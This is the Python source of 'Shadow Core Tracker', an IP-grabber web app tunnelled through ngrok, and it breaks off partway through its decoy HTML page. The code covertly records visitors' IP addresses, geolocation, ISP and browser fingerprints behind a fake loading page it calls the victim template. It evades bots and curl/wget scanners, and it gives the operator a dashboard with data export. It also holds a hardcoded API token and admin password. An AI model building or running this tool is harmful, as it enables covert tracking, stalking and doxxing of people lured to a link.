#!/usr/bin/env python3
"""
SHADOW CORE TRACKER v2.0 - NGROK OPTIMIZED
Ready for ngrok/public hosting with enhanced security
FOR AUTHORIZED SECURITY RESEARCH ONLY
"""

import os
import sys
import json
import sqlite3
import logging
import uuid
import socket
import time
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, jsonify, send_file, Response, make_response
import requests
import threading
import atexit
import subprocess
import re

# ===================== CONFIGURATION =====================
CONFIG = {
    # Network settings optimized for ngrok
    'port': 8080,
    'host': '0.0.0.0',
    'db_file': 'shadow_tracker.db',
    'log_file': 'shadow_system.log',
    
    # API Keys - YOUR KEYS HERE
    'api_keys': {
        'ipinfo': "d5c38457ffc3d8",  # Your ipinfo.io token
        'ipapi': None                 # Optional backup
    },
    
    # Ngrok settings
    'ngrok_autostart': True,           # Auto-start ngrok on launch
    'ngrok_auth_token': None,          # Your ngrok auth token (optional)
    'ngrok_region': 'us',              # us, eu, au, ap, sa, jp, in
    'ngrok_subdomain': None,           # Custom subdomain (requires paid plan)
    
    # Redirect & Tracking
    'redirect_url': 'https://www.google.com',
    'collect_user_agent': True,
    'collect_referrer': True,
    'collect_screen_res': True,
    'collect_timezone': True,
    
    # Security settings (CHANGE THESE!)
    'admin_password': 'ShadowCore@2024',  # CHANGE THIS!
    'session_timeout': 7200,              # 2 hours
    'rate_limit_per_ip': 30,              # requests per minute per IP
    'block_private_ips': False,           # Block 192.168., 10., 172.16. ranges
    'enable_captcha': False,              # Basic CAPTCHA protection
    
    # Dashboard settings
    'enable_realtime_updates': True,
    'auto_refresh_dashboard': 30,         # seconds
    'max_visits_display': 1000,
    
    # Features
    'enable_fingerprinting': True,
    'enable_export': True,
    'enable_delete': True,
    'enable_backup': True,
    
    # Advanced
    'custom_domain': None,                # If using custom domain with ngrok
    'enable_webhook': False,              # Webhook notifications
    'webhook_url': None,                  # Discord/Slack webhook
}

# ===================== SECURITY SETTINGS =====================
BLOCKED_USER_AGENTS = [
    'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 
    'python-requests', 'java', 'php', 'go-http-client'
]

BLOCKED_REFERRERS = [
    'localhost', '127.0.0.1', '192.168.', '10.', '172.16.'
]

# ===================== NGROK INTEGRATION =====================
class NgrokManager:
    """Manage ngrok tunnel automatically"""
    
    def __init__(self):
        self.process = None
        self.public_url = None
        self.status = "stopped"
        
    def start(self):
        """Start ngrok tunnel"""
        try:
            # Check if ngrok is installed
            result = subprocess.run(['ngrok', '--version'], 
                                  capture_output=True, text=True)
            if result.returncode != 0:
                print("[!] ngrok not found. Please install:")
                print("    Windows: choco install ngrok")
                print("    Mac: brew install ngrok")
                print("    Linux: https://ngrok.com/download")
                print("\n[+] Starting without ngrok...")
                return False
            
            # Build ngrok command
            cmd = ['ngrok', 'http', str(CONFIG['port'])]
            
            # Add auth token if provided
            if CONFIG['ngrok_auth_token']:
                cmd.extend(['--authtoken', CONFIG['ngrok_auth_token']])
            
            # Add region
            cmd.extend(['--region', CONFIG['ngrok_region']])
            
            # Add subdomain if provided (requires paid plan)
            if CONFIG['ngrok_subdomain']:
                cmd.extend(['--subdomain', CONFIG['ngrok_subdomain']])
            
            print(f"[+] Starting ngrok: {' '.join(cmd)}")
            
            # Start ngrok process
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Wait for ngrok to start and get URL
            time.sleep(3)
            
            # Try to get ngrok URL from API
            try:
                response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    tunnels = data.get('tunnels', [])
                    if tunnels:
                        self.public_url = tunnels[0].get('public_url')
                        self.status = "running"
                        print(f"[✓] Ngrok URL: {self.public_url}")
                        return True
            except:
                pass
            
            # Alternative: parse ngrok output
            print("[!] Could not get ngrok URL via API. Check ngrok.com dashboard")
            self.status = "unknown"
            return True
            
        except Exception as e:
            print(f"[!] Ngrok error: {e}")
            self.status = "error"
            return False
    
    def stop(self):
        """Stop ngrok tunnel"""
        if self.process:
            self.process.terminate()
            self.process.wait()
            self.status = "stopped"
            print("[+] Ngrok stopped")
    
    def get_url(self):
        """Get public ngrok URL"""
        if not self.public_url:
            try:
                response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
                if response.status_code == 200:
                    data = response.json()
                    tunnels = data.get('tunnels', [])
                    if tunnels:
                        self.public_url = tunnels[0].get('public_url')
            except:
                pass
        return self.public_url

# Initialize ngrok manager
ngrok = NgrokManager()

# ===================== ENHANCED LOGGING =====================
def setup_logger():
    """Setup enhanced logging"""
    logger = logging.getLogger('SHADOW_CORE')
    
    # Clear existing handlers
    if logger.handlers:
        logger.handlers.clear()
    
    # Formatter
    formatter = logging.Formatter(
        '[%(asctime)s] %(levelname)s: %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    # File handler
    fh = logging.FileHandler(CONFIG['log_file'], encoding='utf-8')
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(formatter)
    
    # Console handler
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    ch.setFormatter(formatter)
    
    logger.addHandler(fh)
    logger.addHandler(ch)
    logger.setLevel(logging.INFO)
    
    return logger

logger = setup_logger()

# ===================== ENHANCED DATABASE =====================
class DatabaseManager:
    """Enhanced database operations"""
    
    def __init__(self):
        self.conn = None
        self.lock = threading.Lock()
        self.connect()
    
    def connect(self):
        """Connect to database"""
        try:
            self.conn = sqlite3.connect(CONFIG['db_file'], check_same_thread=False)
            self.conn.row_factory = sqlite3.Row
            self.init_tables()
            logger.info("Database connected")
        except Exception as e:
            logger.error(f"Database connection failed: {e}")
            raise
    
    def init_tables(self):
        """Initialize database tables"""
        with self.lock:
            c = self.conn.cursor()
            
            # Visits table
            c.execute('''CREATE TABLE IF NOT EXISTS visits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip_address TEXT,
                country TEXT,
                region TEXT,
                city TEXT,
                postal TEXT,
                latitude REAL,
                longitude REAL,
                isp TEXT,
                user_agent TEXT,
                referrer TEXT,
                unique_id TEXT UNIQUE,
                hostname TEXT,
                success INTEGER DEFAULT 1,
                flagged INTEGER DEFAULT 0,
                session_id TEXT
            )''')
            
            # Fingerprints table
            c.execute('''CREATE TABLE IF NOT EXISTS fingerprints (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                visit_id INTEGER,
                browser TEXT,
                platform TEXT,
                languages TEXT,
                cookies_enabled INTEGER,
                timezone TEXT,
                screen_width INTEGER,
                screen_height INTEGER,
                color_depth INTEGER,
                hardware_concurrency INTEGER,
                device_memory INTEGER,
                canvas_hash TEXT,
                FOREIGN KEY(visit_id) REFERENCES visits(id)
            )''')
            
            # Sessions table
            c.execute('''CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                created_at TEXT,
                last_activity TEXT,
                ip_address TEXT,
                user_agent TEXT
            )''')
            
            # Analytics table
            c.execute('''CREATE TABLE IF NOT EXISTS analytics (
                date TEXT PRIMARY KEY,
                visits INTEGER DEFAULT 0,
                unique_visitors INTEGER DEFAULT 0,
                countries TEXT DEFAULT ''
            )''')
            
            # Create indexes
            c.execute('CREATE INDEX IF NOT EXISTS idx_ip ON visits(ip_address)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_time ON visits(timestamp)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_country ON visits(country)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_session ON visits(session_id)')
            
            self.conn.commit()
    
    def add_visit(self, visit_data):
        """Add a new visit to database"""
        with self.lock:
            try:
                c = self.conn.cursor()
                c.execute('''INSERT INTO visits 
                    (timestamp, ip_address, country, region, city, postal,
                     latitude, longitude, isp, user_agent, referrer,
                     unique_id, hostname, success, flagged, session_id)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (visit_data['timestamp'], visit_data['ip_address'],
                     visit_data['country'], visit_data['region'],
                     visit_data['city'], visit_data['postal'],
                     visit_data['latitude'], visit_data['longitude'],
                     visit_data['isp'], visit_data['user_agent'],
                     visit_data['referrer'], visit_data['unique_id'],
                     visit_data['hostname'], visit_data['success'],
                     visit_data.get('flagged', 0), visit_data.get('session_id', '')))
                
                visit_id = c.lastrowid
                self.conn.commit()
                return visit_id
            except Exception as e:
                logger.error(f"Error adding visit: {e}")
                return None
    
    def add_fingerprint(self, visit_id, fingerprint):
        """Add fingerprint data"""
        with self.lock:
            try:
                c = self.conn.cursor()
                c.execute('''INSERT INTO fingerprints 
                    (visit_id, browser, platform, languages, cookies_enabled,
                     timezone, screen_width, screen_height, color_depth,
                     hardware_concurrency, device_memory, canvas_hash)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (visit_id, fingerprint.get('browser'),
                     fingerprint.get('platform'), fingerprint.get('languages'),
                     fingerprint.get('cookies_enabled', 0),
                     fingerprint.get('timezone'),
                     fingerprint.get('screen_width', 0),
                     fingerprint.get('screen_height', 0),
                     fingerprint.get('color_depth', 24),
                     fingerprint.get('hardware_concurrency', 0),
                     fingerprint.get('device_memory', 0),
                     fingerprint.get('canvas_hash', '')))
                self.conn.commit()
            except Exception as e:
                logger.error(f"Error adding fingerprint: {e}")
    
    def get_stats(self):
        """Get dashboard statistics"""
        with self.lock:
            c = self.conn.cursor()
            stats = {}
            
            # Total visits
            c.execute('SELECT COUNT(*) FROM visits')
            stats['total_visits'] = c.fetchone()[0]
            
            # Today's visits
            c.execute("SELECT COUNT(*) FROM visits WHERE date(timestamp) = date('now')")
            stats['today_visits'] = c.fetchone()[0]
            
            # Unique IPs
            c.execute('SELECT COUNT(DISTINCT ip_address) FROM visits')
            stats['unique_ips'] = c.fetchone()[0]
            
            # Countries count
            c.execute('SELECT COUNT(DISTINCT country) FROM visits WHERE country != "Unknown"')
            stats['countries'] = c.fetchone()[0]
            
            # Recent visits (last 20)
            c.execute('''SELECT timestamp, ip_address, country, city, isp, user_agent 
                         FROM visits ORDER BY timestamp DESC LIMIT 20''')
            stats['recent_visits'] = [dict(row) for row in c.fetchall()]
            
            # Top countries
            c.execute('''SELECT country, COUNT(*) as count 
                         FROM visits WHERE country != "Unknown" 
                         GROUP BY country ORDER BY count DESC LIMIT 10''')
            stats['top_countries'] = [dict(row) for row in c.fetchall()]
            
            # Hourly activity (last 24h)
            c.execute('''SELECT strftime('%H', timestamp) as hour, COUNT(*) as count
                         FROM visits WHERE timestamp > datetime('now', '-24 hours')
                         GROUP BY hour ORDER BY hour''')
            stats['hourly_activity'] = [dict(row) for row in c.fetchall()]
            
            return stats

# Initialize database
db = DatabaseManager()

# ===================== SECURITY FUNCTIONS =====================
def is_blocked_ip(ip_address):
    """Check if IP should be blocked"""
    if CONFIG['block_private_ips']:
        if ip_address.startswith(('192.168.', '10.', '172.16.', '127.')):
            return True
    return False

def is_blocked_user_agent(user_agent):
    """Check for bots/crawlers"""
    if not user_agent:
        return False
    
    ua_lower = user_agent.lower()
    for blocked in BLOCKED_USER_AGENTS:
        if blocked in ua_lower:
            return True
    return False

def is_blocked_referrer(referrer):
    """Check for suspicious referrers"""
    if not referrer:
        return False
    
    for blocked in BLOCKED_REFERRERS:
        if blocked in referrer:
            return True
    return False

def get_client_ip():
    """Get client IP with security checks"""
    headers = [
        'X-Forwarded-For',
        'X-Real-IP',
        'CF-Connecting-IP',
        'True-Client-IP'
    ]
    
    for header in headers:
        if header in request.headers:
            ip = request.headers[header].split(',')[0].strip()
            if validate_ip(ip):
                return ip
    
    return request.remote_addr or '0.0.0.0'

def validate_ip(ip):
    """Validate IP address"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# ===================== GEO-LOCATION SERVICE =====================
class GeoLocator:
    """Enhanced geolocation with caching"""
    
    def __init__(self):
        self.cache = {}
        self.cache_time = 3600  # 1 hour cache
        
    def get_location(self, ip_address):
        """Get location for IP with caching"""
        # Check cache
        if ip_address in self.cache:
            cached_time, data = self.cache[ip_address]
            if time.time() - cached_time < self.cache_time:
                return data
        
        # Get fresh data
        data = self._fetch_location(ip_address)
        
        # Cache it
        self.cache[ip_address] = (time.time(), data)
        
        # Clean old cache entries
        self._clean_cache()
        
        return data
    
    def _fetch_location(self, ip_address):
        """Fetch location from APIs"""
        # Private IPs
        if ip_address.startswith(('192.168.', '10.', '172.16.', '127.')):
            return {
                'country': 'Local Network',
                'region': 'Private IP',
                'city': 'Local Network',
                'postal': 'N/A',
                'lat': 0.0,
                'lon': 0.0,
                'isp': 'Local Network',
                'hostname': get_hostname(ip_address),
                'success': 0
            }
        
        # Try ipinfo.io first
        if CONFIG['api_keys']['ipinfo']:
            try:
                response = requests.get(
                    f'https://ipinfo.io/{ip_address}/json?token={CONFIG["api_keys"]["ipinfo"]}',
                    timeout=3
                )
                if response.status_code == 200:
                    data = response.json()
                    return {
                        'country': data.get('country', 'Unknown'),
                        'region': data.get('region', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'postal': data.get('postal', 'Unknown'),
                        'lat': float(data.get('loc', '0,0').split(',')[0]) if 'loc' in data else 0.0,
                        'lon': float(data.get('loc', '0,0').split(',')[1]) if 'loc' in data else 0.0,
                        'isp': data.get('org', 'Unknown'),
                        'hostname': data.get('hostname', 'Unknown'),
                        'success': 1
                    }
            except Exception as e:
                logger.debug(f"ipinfo.io failed: {e}")
        
        # Fallback to ip-api.com (free)
        try:
            response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=3)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country', 'Unknown'),
                        'region': data.get('regionName', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'postal': data.get('zip', 'Unknown'),
                        'lat': data.get('lat', 0.0),
                        'lon': data.get('lon', 0.0),
                        'isp': data.get('isp', 'Unknown'),
                        'hostname': data.get('query', ip_address),
                        'success': 1
                    }
        except Exception as e:
            logger.debug(f"ip-api.com failed: {e}")
        
        # Return unknown
        return {
            'country': 'Unknown',
            'region': 'Unknown',
            'city': 'Unknown',
            'postal': 'Unknown',
            'lat': 0.0,
            'lon': 0.0,
            'isp': 'Unknown',
            'hostname': 'Unknown',
            'success': 0
        }
    
    def _clean_cache(self):
        """Clean old cache entries"""
        current_time = time.time()
        to_delete = []
        
        for ip, (cached_time, _) in self.cache.items():
            if current_time - cached_time > self.cache_time * 2:  # 2x cache time
                to_delete.append(ip)
        
        for ip in to_delete:
            del self.cache[ip]

def get_hostname(ip):
    """Get hostname for IP"""
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return 'Unknown'

# Initialize geolocator
geolocator = GeoLocator()

# ===================== FLASK APPLICATION =====================
app = Flask(__name__)
app.secret_key = os.urandom(32)

# Rate limiting dictionary
rate_limits = {}
rate_lock = threading.Lock()

def check_rate_limit(ip_address):
    """Basic rate limiting"""
    if CONFIG['rate_limit_per_ip'] <= 0:
        return True
    
    current_time = time.time()
    with rate_lock:
        if ip_address not in rate_limits:
            rate_limits[ip_address] = []
        
        # Clean old requests
        rate_limits[ip_address] = [
            t for t in rate_limits[ip_address] 
            if current_time - t < 60  # Last minute
        ]
        
        # Check if over limit
        if len(rate_limits[ip_address]) >= CONFIG['rate_limit_per_ip']:
            return False
        
        # Add current request
        rate_limits[ip_address].append(current_time)
        return True

# ===================== ROUTES =====================
@app.route('/')
def index():
    """Main tracking endpoint"""
    client_ip = get_client_ip()
    
    # Security checks
    if is_blocked_ip(client_ip):
        return render_template_string(VICTIM_TEMPLATE, error="Access denied", redirect_url=CONFIG['redirect_url'], city="Unknown", country="Unknown", unique_id=""), 403
    
    if not check_rate_limit(client_ip):
        return render_template_string(VICTIM_TEMPLATE, error="Too many requests", redirect_url=CONFIG['redirect_url'], city="Unknown", country="Unknown", unique_id=""), 429
    
    # Check user agent
    user_agent = request.user_agent.string if CONFIG['collect_user_agent'] else ''
    if is_blocked_user_agent(user_agent):
        return render_template_string(VICTIM_TEMPLATE, error="Access denied", redirect_url=CONFIG['redirect_url'], city="Unknown", country="Unknown", unique_id=""), 403
    
    # Check referrer
    referrer = request.referrer if CONFIG['collect_referrer'] else ''
    if is_blocked_referrer(referrer):
        return render_template_string(VICTIM_TEMPLATE, error="Access denied", redirect_url=CONFIG['redirect_url'], city="Unknown", country="Unknown", unique_id=""), 403
    
    # Generate unique ID
    unique_id = str(uuid.uuid4())
    
    # Generate session ID (for multiple visits from same browser)
    session_id = request.cookies.get('shadow_session')
    if not session_id:
        session_id = str(uuid.uuid4())
    
    # Get geolocation
    geo_data = geolocator.get_location(client_ip)
    
    # Prepare visit data
    visit_data = {
        'timestamp': datetime.now().isoformat(),
        'ip_address': client_ip,
        'country': geo_data['country'],
        'region': geo_data['region'],
        'city': geo_data['city'],
        'postal': geo_data['postal'],
        'latitude': geo_data['lat'],
        'longitude': geo_data['lon'],
        'isp': geo_data['isp'],
        'user_agent': user_agent,
        'referrer': referrer,
        'unique_id': unique_id,
        'hostname': geo_data['hostname'],
        'success': geo_data['success'],
        'session_id': session_id
    }
    
    # Flag suspicious visits
    flagged = 0
    if is_blocked_user_agent(user_agent):
        flagged = 1
    if is_blocked_referrer(referrer):
        flagged = 1
    
    visit_data['flagged'] = flagged
    
    # Save to database
    visit_id = db.add_visit(visit_data)
    
    if visit_id:
        location = f"{geo_data['city']}, {geo_data['country']}" if geo_data['success'] else "Unknown"
        logger.info(f"Visit #{visit_id}: {client_ip} from {location} | UA: {user_agent[:50]}...")
    
    # Create response with tracking page
    response = make_response(render_template_string(
        VICTIM_TEMPLATE,
        redirect_url=CONFIG['redirect_url'],
        unique_id=unique_id,
        country=geo_data['country'],
        city=geo_data['city']
    ))
    
    # Set session cookie
    response.set_cookie(
        'shadow_session',
        session_id,
        max_age=2592000,  # 30 days
        httponly=True,
        samesite='Lax'
    )
    
    # Set tracking cookie
    response.set_cookie(
        'tracking_id',
        unique_id,
        max_age=2592000,
        httponly=True,
        samesite='Lax'
    )
    
    return response

@app.route('/collect', methods=['POST'])
def collect():
    """Collect additional data via AJAX"""
    try:
        data = request.json
        unique_id = data.get('unique_id')
        
        if unique_id and CONFIG['enable_fingerprinting']:
            # Find visit by unique_id
            c = db.conn.cursor()
            c.execute('SELECT id FROM visits WHERE unique_id = ?', (unique_id,))
            row = c.fetchone()
            
            if row:
                visit_id = row[0]
                fingerprint = data.get('fingerprint', {})
                db.add_fingerprint(visit_id, fingerprint)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Collection error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Admin login"""
    if request.method == 'POST':
        password = request.form.get('password', '')
        
        if password == CONFIG['admin_password']:
            # Create session
            session_id = str(uuid.uuid4())
            c = db.conn.cursor()
            c.execute('INSERT INTO sessions VALUES (?, ?, ?, ?, ?)',
                     (session_id, datetime.now().isoformat(),
                      datetime.now().isoformat(), get_client_ip(),
                      request.user_agent.string))
            db.conn.commit()
            
            response = redirect('/dashboard')
            response.set_cookie('admin_session', session_id,
                              max_age=CONFIG['session_timeout'],
                              httponly=True, samesite='Strict')
            
            logger.info(f"Admin login from {get_client_ip()}")
            return response
        else:
            logger.warning(f"Failed login attempt from {get_client_ip()}")
            return render_template_string(LOGIN_TEMPLATE, error="Invalid password")
    
    return render_template_string(LOGIN_TEMPLATE)

def check_admin_session():
    """Check if admin is logged in"""
    session_id = request.cookies.get('admin_session')
    if not session_id:
        return False
    
    c = db.conn.cursor()
    c.execute('SELECT 1 FROM sessions WHERE session_id = ?', (session_id,))
    return c.fetchone() is not None

@app.route('/dashboard')
def dashboard():
    """Admin dashboard"""
    if not check_admin_session():
        return redirect('/login')
    
    # Update session activity
    session_id = request.cookies.get('admin_session')
    if session_id:
        c = db.conn.cursor()
        c.execute('UPDATE sessions SET last_activity = ? WHERE session_id = ?',
                 (datetime.now().isoformat(), session_id))
        db.conn.commit()
    
    # Get statistics
    stats = db.get_stats()
    
    # Get public URL
    public_url = ngrok.get_url() or "http://localhost:8080"
    
    # Render dashboard
    return render_template_string(DASHBOARD_TEMPLATE,
                                 stats=stats,
                                 public_url=public_url,
                                 config=CONFIG,
                                 auto_refresh=CONFIG['auto_refresh_dashboard'],
                                 request=request,
                                 datetime=datetime)

@app.route('/api/stats')
def api_stats():
    """API endpoint for dashboard updates"""
    if not check_admin_session():
        return jsonify({'error': 'Unauthorized'}), 401
    
    stats = db.get_stats()
    return jsonify(stats)

@app.route('/export')
def export_data():
    """Export data as JSON"""
    if not check_admin_session():
        return redirect('/login')
    
    c = db.conn.cursor()
    c.execute('''SELECT v.*, f.browser, f.platform, f.timezone, f.screen_width, f.screen_height
                 FROM visits v 
                 LEFT JOIN fingerprints f ON v.id = f.visit_id 
                 ORDER BY v.timestamp DESC''')
    
    columns = [col[0] for col in c.description]
    data = [dict(zip(columns, row)) for row in c.fetchall()]
    
    filename = f'shadow_data_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    
    # Save to file
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, default=str)
    
    logger.info(f"Data exported: {filename}")
    return send_file(filename, as_attachment=True)

@app.route('/clear', methods=['POST'])
def clear_data():
    """Clear all data (requires confirmation)"""
    if not check_admin_session():
        return jsonify({'error': 'Unauthorized'}), 401
    
    c = db.conn.cursor()
    c.execute('DELETE FROM visits')
    c.execute('DELETE FROM fingerprints')
    c.execute('DELETE FROM sessions')
    db.conn.commit()
    
    logger.warning("All data cleared by admin")
    return jsonify({'status': 'success', 'message': 'All data cleared'})

@app.route('/logout')
def logout():
    """Logout admin"""
    session_id = request.cookies.get('admin_session')
    if session_id:
        c = db.conn.cursor()
        c.execute('DELETE FROM sessions WHERE session_id = ?', (session_id,))
        db.conn.commit()
    
    response = redirect('/login')
    response.set_cookie('admin_session', '', expires=0)
    return response

# ===================== TEMPLATES =====================
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>SHADOW CORE - Authentication</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap');
        
        * { box-sizing: border-box; }
        
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0a0e27 0%, #141829 50%, #0f1429 100%);
            font-family: 'JetBrains Mono', monospace;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            color: #e0e0e0;
        }
        
        .glow-1 {
            position: fixed;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(16, 185, 129, 0.15), transparent);
            top: -100px;
            right: -100px;
            border-radius: 50%;
            animation: float 6s infinite;
            z-index: -1;
        }
        
        .glow-2 {
            position: fixed;
            width: 200px;
            height: 200px;
            background: radial-gradient(circle, rgba(6, 182, 212, 0.15), transparent);
            bottom: -50px;
            left: -50px;
            border-radius: 50%;
            animation: float 8s infinite reverse;
            z-index: -1;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(30px); }
        }
        
        .login-container {
            background: rgba(20, 25, 45, 0.95);
            backdrop-filter: blur(20px);
            padding: 50px;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), inset 0 0 30px rgba(16, 185, 129, 0.05);
            width: 100%;
            max-width: 420px;
            border: 1px solid rgba(16, 185, 129, 0.15);
            position: relative;
            overflow: hidden;
        }
        
        .login-container::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(16, 185, 129, 0.1), transparent);
            border-radius: 50%;
            animation: pulse 4s ease-in-out infinite;
            z-index: 0;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.1; }
            50% { transform: scale(1.1); opacity: 0.15; }
        }
        
        .logo {
            text-align: center;
            margin-bottom: 40px;
            position: relative;
            z-index: 1;
        }
        
        .logo-text {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(135deg, #10b981, #06b6d4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin: 0;
            letter-spacing: 2px;
        }
        
        .logo-subtext {
            font-size: 11px;
            color: #666;
            margin-top: 8px;
            letter-spacing: 1px;
        }
        
        .input-group {
            margin-bottom: 25px;
            position: relative;
            z-index: 1;
        }
        
        .input-label {
            display: block;
            font-size: 11px;
            color: #10b981;
            margin-bottom: 8px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 14px;
            font-family: 'JetBrains Mono', monospace;
            transition: all 0.3s ease;
        }
        
        input::placeholder {
            color: #555;
        }
        
        input:focus {
            outline: none;
            border-color: #10b981;
            background: rgba(16, 185, 129, 0.05);
            box-shadow: 0 0 20px rgba(16, 185, 129, 0.2), inset 0 0 10px rgba(16, 185, 129, 0.05);
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #10b981, #059669);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 14px;
            font-weight: 700;
            font-family: 'JetBrains Mono', monospace;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            z-index: 1;
            box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
            background: linear-gradient(135deg, #059669, #047857);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .error {
            color: #ef4444;
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            padding: 12px;
            border-radius: 8px;
            position: relative;
            z-index: 1;
        }
        
        .info-footer {
            color: #666;
            font-size: 11px;
            text-align: center;
            margin-top: 25px;
            position: relative;
            z-index: 1;
            letter-spacing: 1px;
        }
        
        .info-footer span {
            opacity: 0.6;
            margin-top: 8px;
            display: block;
            font-size: 10px;
        }
    </style>
</head>
<body>
    <div class="glow-1"></div>
    <div class="glow-2"></div>
    
    <div class="login-container">
        <div class="logo">
            <h1 class="logo-text">⚡ SHADOW</h1>
            <div class="logo-subtext">AUTHENTICATION REQUIRED</div>
        </div>
        
        <form method="POST" action="/login">
            <div class="input-group">
                <label class="input-label">Access Code</label>
                <input type="password" name="password" placeholder="••••••••••••••••" required autofocus>
            </div>
            
            <button type="submit">▸ AUTHENTICATE</button>
        </form>
        
        {% if error %}
        <div class="error">⚠ {{ error }}</div>
        {% endif %}
        
        <div class="info-footer">
            v2.0 | ngrok optimized | encrypted
            <span>© 2025 AFRAFDHMA</span>
        </div>
    </div>
</body>
</html>
"""

VICTIM_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
        
        * { box-sizing: border-box; }
        
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #1a1a2e 0%, #0f3460 50%, #16213e 100%);
            font-family: 'Space Mono', monospace;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        .container {
            position: relative;
            z-index: 10;
            text-align: center;
            max-width: 600px;
            padding: 20px;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 3px solid rgba(16, 185, 129, 0.2);
            border-top: 3px solid #10b981;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 30px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            color: #10b981;
            margin: 0 0 10px 0;
            font-size: 28px;
            text-shadow: 0 0 20px rgba(16, 185, 129, 0.5);
            animation: fadeIn 0.8s ease-in;
        }
        
        p {
            color: #cbd5e0;
            font-size: 14px;
            margin: 10px 0;
            animation: fadeIn 1.2s ease-in;
        }
        
        .info-box {
            background: rgba(16, 185, 129, 0.05);
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
            animation: slideUp 0.8s ease-out;
        }
        
        .info-box h3 {
            color: #10b981;
            margin: 0 0 10px 0;
            font-size: 14px;
        }
        
        .info-box p {
            margin: 5px 0;
            color: #a0aec0;
            font-size: 12px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from { 
                opacity: 0;
                transform: translateY(20px);
            }
            to { 
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .redirect-text {
            color: #718096;
            font-size: 12px;
            margin-top: 40px;
        }
        
        .dots {
            display: inline-block;
            animation: dots 1.5s steps(4, end) infinite;
        }
        
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>⚡ Processing Request</h1>
        <p>Initializing secure connection<span class="dots">.</span></p>
        
        <div class="info-box">
            <h3>SESSION INFORMATION</h3>
            <p>📍 Location: {{ city }}, {{ country }}</p>
            <p>🔐 Session ID: {{ unique_id[:8] }}...</p>
            <p>✓ Status: Connected</p>
        </div>
        
